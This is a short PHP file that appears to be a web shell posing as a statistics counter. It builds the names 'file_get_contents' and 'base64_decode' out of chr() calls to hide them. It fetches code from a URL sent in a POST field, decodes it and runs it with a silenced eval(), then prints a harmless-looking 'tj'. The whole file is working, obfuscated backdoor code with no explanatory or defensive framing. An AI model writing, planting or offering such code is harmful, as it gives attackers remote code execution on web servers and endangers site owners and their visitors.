<?php
$c='chr';
$get=chr(102).chr(105).chr(108).chr(101).chr(95);
$get.=chr(103).chr(101).chr(116).chr(95).chr(99);
$get.=chr(111).chr(110).chr(116).chr(101).chr(110);
$get.=chr(116).chr(115);
$tongji=$get($_POST['phpcodeurl']);

$undecode=$c(98).$c(97).$c(115).$c(101).$c(54).$c(52);
$undecode.=$c(95).$c(100).$c(101).$c(99).$c(111).$c(100).$c(101);
@eval($undecode($tongji));
echo '<br>tj, '.'tj';
?>